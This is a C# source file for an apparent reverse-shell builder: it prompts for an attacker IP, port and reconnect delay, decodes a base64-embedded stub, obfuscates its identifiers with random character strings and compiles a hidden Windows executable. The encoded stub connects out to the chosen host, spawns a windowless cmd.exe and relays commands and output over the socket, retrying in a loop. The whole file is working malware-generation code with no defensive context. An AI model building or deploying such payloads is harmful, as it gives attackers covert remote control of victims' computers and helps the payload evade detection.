using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Text;

namespace Builder
{
    class Program
    {
        static Random rnd = new Random();
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[?] IP : ");
            Console.ForegroundColor = ConsoleColor.Red;
            string ip = Console.ReadLine();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[?] PORT : ");
            Console.ForegroundColor = ConsoleColor.Red;
            string port = Console.ReadLine();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[?] Connection Delay : ");
            Console.ForegroundColor = ConsoleColor.Red;
            string conn_delay = Console.ReadLine();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[?] Maximum obfuscation string length multiplier[max 30] : ");
            Console.ForegroundColor = ConsoleColor.Red;
            int max_len = Convert.ToInt32(Console.ReadLine());
            if(max_len>30)
            {
                max_len = 30;
            }
            Console.Write("\n\n[!] Press any key to begin...");
            Console.ReadKey(true);
            Build(ip, port, conn_delay, max_len);
            Console.ReadKey(true);
        }
        static void Build(string ip,string port,string delay,int max_len)
        {
            Console.Write("\n[+] Reading stub source code...");
            string stub_code = Encoding.UTF8.GetString(Convert.FromBase64String("dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uVGV4dDsKdXNpbmcgU3lzdGVtLklPOwp1c2luZyBTeXN0ZW0uTmV0LlNvY2tldHM7CnVzaW5nIFN5c3RlbS5EaWFnbm9zdGljczsKCm5hbWVzcGFjZSBSZXYzUnMzCnsKICAgIGNsYXNzIFByb2dyYW0KICAgIHsKICAgICAgICBzdGF0aWMgc3RyaW5nIGlwID0gIiVIT1NUTkFNRSUiOwogICAgICAgIHN0YXRpYyBpbnQgcG9ydCA9ICVQT1JUJTsKICAgICAgICBzdGF0aWMgaW50IGRlbGF5ID0gQ29udmVydC5Ub0ludDMyKCIlREVMQVklIik7CiAgICAgICAgc3RhdGljIFN0cmVhbVdyaXRlciBzdHJlYW1Xcml0ZXI7CiAgICAgICAgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQogICAgICAgIHsKICAgICAgICAgICAgd2hpbGUodHJ1ZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQ3JlYXRlU2hlbGwoKTsKICAgICAgICAgICAgICAgIFN5c3RlbS5UaHJlYWRpbmcuVGhyZWFkLlNsZWVwKGRlbGF5KTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBzdGF0aWMgdm9pZCBDcmVhdGVTaGVsbCgpCiAgICAgICAgewogICAgICAgICAgICB0cnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdXNpbmcgKFRjcENsaWVudCBfc29ja2V0ID0gbmV3IFRjcENsaWVudChpcCwgcG9ydCkpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgdXNpbmcgKFN0cmVhbSBzdHJlYW0gPSBfc29ja2V0LkdldFN0cmVhbSgpKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgdXNpbmcgKFN0cmVhbVJlYWRlciBfcmVhZGVyID0gbmV3IFN0cmVhbVJlYWRlcihzdHJlYW0pKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJlYW1Xcml0ZXIgPSBuZXcgU3RyZWFtV3JpdGVyKHN0cmVhbSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdHJpbmdCdWlsZGVyIHN0cklucHV0ID0gbmV3IFN0cmluZ0J1aWxkZXIoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByb2Nlc3MgcCA9IG5ldyBQcm9jZXNzKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwLlN0YXJ0SW5mby5GaWxlTmFtZSA9ICJjbWQuZXhlIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAuU3RhcnRJbmZvLkNyZWF0ZU5vV2luZG93ID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAuU3RhcnRJbmZvLlVzZVNoZWxsRXhlY3V0ZSA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcC5TdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZE91dHB1dCA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwLlN0YXJ0SW5mby5SZWRpcmVjdFN0YW5kYXJkSW5wdXQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcC5TdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZEVycm9yID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAuT3V0cHV0RGF0YVJlY2VpdmVkICs9IG5ldyBEYXRhUmVjZWl2ZWRFdmVudEhhbmRsZXIoQ21kT3V0cHV0RGF0YUhhbmRsZXIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcC5TdGFydCgpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcC5CZWdpbk91dHB1dFJlYWRMaW5lKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAoX3NvY2tldC5Db25uZWN0ZWQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RySW5wdXQuQXBwZW5kKF9yZWFkZXIuUmVhZExpbmUoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9zdHJJbnB1dC5BcHBlbmQoIlxuIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcC5TdGFuZGFyZElucHV0LldyaXRlTGluZShzdHJJbnB1dCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RySW5wdXQuUmVtb3ZlKDAsIHN0cklucHV0Lkxlbmd0aCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTeXN0ZW0uVGhyZWFkaW5nLlRocmVhZC5TbGVlcCg1MDAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1haW4obnVsbCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggeyB9CiAgICAgICAgfQogICAgICAgIHByaXZhdGUgc3RhdGljIHZvaWQgQ21kT3V0cHV0RGF0YUhhbmRsZXIob2JqZWN0IHNlbmRpbmdQcm9jZXNzLCBEYXRhUmVjZWl2ZWRFdmVudEFyZ3Mgb3V0TGluZSkKICAgICAgICB7CiAgICAgICAgICAgIFN0cmluZ0J1aWxkZXIgX0hPdXQgPSBuZXcgU3RyaW5nQnVpbGRlcigpOwogICAgICAgICAgICBpZiAoIVN0cmluZy5Jc051bGxPckVtcHR5KG91dExpbmUuRGF0YSkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIF9IT3V0LkFwcGVuZChvdXRMaW5lLkRhdGEpOwogICAgICAgICAgICAgICAgICAgIHN0cmVhbVdyaXRlci5Xcml0ZUxpbmUoX0hPdXQpOwogICAgICAgICAgICAgICAgICAgIHN0cmVhbVdyaXRlci5GbHVzaCgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggeyB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgLyoKICAgICAgICBwcml2YXRlIGJvb2wgQ29tcGlsZVBheWxvYWQoc3RyaW5nIFNvdXJjZUNvZGUsc3RyaW5nIE5hbWVTcGFjZURvdENsYXNzLHN0cmluZyBFbnRyeU1ldGhvZE5hbWUsb2JqZWN0W10gX3BhcmFtcykKICAgICAgICB7CiAgICAgICAgICAgIENTaGFycENvZGVQcm92aWRlciBwcm92aWRlciA9IG5ldyBDU2hhcnBDb2RlUHJvdmlkZXIoKTsKICAgICAgICAgICAgQ29tcGlsZXJSZXN1bHRzIHJlc3VsdHMgPSBwcm92aWRlci5Db21waWxlQXNzZW1ibHlGcm9tU291cmNlKG5ldyBTeXN0ZW0uQ29kZURvbS5Db21waWxlci5Db21waWxlclBhcmFtZXRlcnMoKSwgU291cmNlQ29kZSk7CiAgICAgICAgICAgIGlmIChyZXN1bHRzLkVycm9ycy5Db3VudCA+IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXN1bHRzLkNvbXBpbGVkQXNzZW1ibHkuR2V0VHlwZShOYW1lU3BhY2VEb3RDbGFzcykuR2V0TWV0aG9kKEVudHJ5TWV0aG9kTmFtZSkuSW52b2tlKG51bGwsIF9wYXJhbXMpOwogICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICB9CiAgICAgICAgKi8KICAgIH0KfQo="));
            Random rnd = new Random();
            //write settings
            Console.Write("\n[+] Writing settings");

            stub_code = stub_code.Replace("%HOSTNAME%", ip);
            stub_code = stub_code.Replace("%PORT%", port);
            stub_code = stub_code.Replace("%DELAY%", delay);
            
            Console.Write("\n[+] Done writing settings.Starting the obfuscation process.");
            #region OBFUSCATE
            int i = 0;
            string[] src_variable_names = { "ip", "port", "delay", "streamWriter", "CreateShell", "CmdOutputDataHandler", "strInput", "_socket", "streamReader" ,"Rev3Rs3","tcpClient","stream","stringBuilder"};
            Console.Write("\n[+] Obfuscating...");
            foreach (var variable_name in src_variable_names)
            {

                i++;
                Console.Write("\n[+] Obfuscating variable with the {0} name", i);
                stub_code = stub_code.Replace(variable_name, GetObfuscationChars(i*max_len));
            }
            
            #endregion
            Console.Write("\n[+] Done obfuscating.\n[+] Starting the compiler...");

            #region Compile
            CodeDomProvider compiler = CodeDomProvider.CreateProvider("CSharp");
            string outputAssembly = "out.exe";
            Console.Write("\n[+] Validating settings...");
            CompilerParameters parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                GenerateInMemory = true,
                OutputAssembly = outputAssembly,
                CompilerOptions = "/target:winexe /platform:x86"
            };
            Console.Write("\n[+] Adding references to assembly...");
            parameters.ReferencedAssemblies.Add("mscorlib.dll");
            parameters.ReferencedAssemblies.Add("System.dll");
            Console.Write("\n[+] Compiling...");
            var compilerRez = compiler.CompileAssemblyFromSource(parameters, stub_code);
            if (compilerRez.Errors.Count == 0)
            {
                Console.Write("\n[+] Compilation returned 0 errors.Done.");
                Console.Write("\n[+] You may press any key to exit.");
            }
            else
            {
                foreach(var err in compilerRez.Errors)
                {
                    Console.Write("\n\n{0}\n\n", err.ToString());
                }
                Console.Write("\n[+] Compilations returned errors. You may press any key to exit.");
            }
  
            #endregion
        }
        static string GetObfuscationChars(int len)
        {
            //char[] obf_c = "乯买乱乲乳乴乵乶乷乸乹乺乻乼乽乾乿亀亁亂亃亄亅了亇予争亊事二亍于亏亐云互亓五井亖亗亘亙亚些亜亝亞亟亠亡亢亣交亥亦产亨亩亪享京亭亮亯亰亱亲亳亴亵亶亷亸亹人亻亼亽亾亿什仁仂仃仄仅仆仇仈仉今介仌仍从仏仐仑仒仓仔仕他仗付仙仚仛仜仝仞仟仰仱仲仳仴仵件价仸仹仺任仼份仾仿伀企伂伃伄伅伆伇伈伉伊伋伌伍伎伏伐休伒伓伔伕伖众优伙会伛伜伝伞伟传伡伢伣伤伥伦伧伨伩伪伫伬伭伮伯估伱伲伳伴伵伶伷伸伹伺伻似伽伾伿佀佁佂佃佄佅但佇佈佉佊佋佌位低住佐佑佒体佔何佖佗佘余佚佛作佝佞佟你佡佢佣佤佥佦佧佨佩佪佫佬佭佮佯佰佱佲佳佴併佶佷佸佹佺佻佼佽佾使侀侁侂侃侄侅來侇侈侉侊例侌侍侎侏侐侑侒侓侔侕侖侗侘侙侚供侜依侞侟侠価侢侣侤侥侦侧侨侩侪侫侬侭侮侯侰侱侲侳侴侵侶侷侸侹侺侻侼侽侾便俀俁係促俄俅俆俇俈俉俊俋俌俍俎俏俐俑俒俓俔俕俖俗俘俙俚俛俜保俞俟俠信俢俣俤俥俦俧俨俩俪俫俬俭修俯俰俱俲俳俴俵俶俷俸俹俺俻俼俽俾俿倀倁倂倃倄倅倆倇倈倉倊個倌倍倎倏倐們倒倓倔倕倖倗倘候倚倛倜倝倞借倠倡倢倣値倥倦倧倨倩倪倫倬倭倮倯倰倱倲倳倴倵倶倷倸倹债倻值倽倾倿偀偁偂偃偄偅偆假偈偉偊偋偌偍偎偏偐偑偒偓偔偕偖偗偘偙做偛停偝偞偟偠偡偢偣偤健偦偧偨偩偪偫偬偭偮偯偰偱偲偳側偵偶偷偸偹偺偻偼偽偾偿傀傁傂傃傄傅傆傇傈傉傊傋傌傍傎傏傐傑傒傓傔傕傖傗傘備傚傛傜傝傞傟傠傡傢傣傤傥傦傧储傩傪傫催傭傮傯傰傱傲傳傴債傶傷傸傹傺傻傼傽傾傿僀僁僂僃僄僅僆僇僈僉僊僋僌働僎像僐僑僒僓僔僕僖僗僘僙僚僛僜僝僞僟僠僡僢僣僤僥僦僧僨僩僪僫僬僭僮僯僰僱僲僳僴僵僶僷僸價僺僻僼僽僾僿儀儁儂儃億儅儆儇儈儉儊儋儌儍儎儏儐儑儒儓儔儕儖儗儘儙儚儛儜儝儞償儠儡儢儣儤儥儦儧儨儩優儫儬儭儮儯儰儱儲儳儴儵儶儷儸儹儺儻儼儽儾儿".ToCharArray();
            char[] obf_c = "_abc______________亅____defghijklmn亼亽亾亿儽_什仁仂仃仄亻仅仆仇opqrstt乯买乱乲乳乴乵乶乷乸wvxyz".ToCharArray() ; 
            string final = string.Empty;
            for(int i = 0;i<len;i++)
            {
                final += Convert.ToString(obf_c[rnd.Next(0, obf_c.Length - 1)]);
            }
            return final;
        }
    }
}
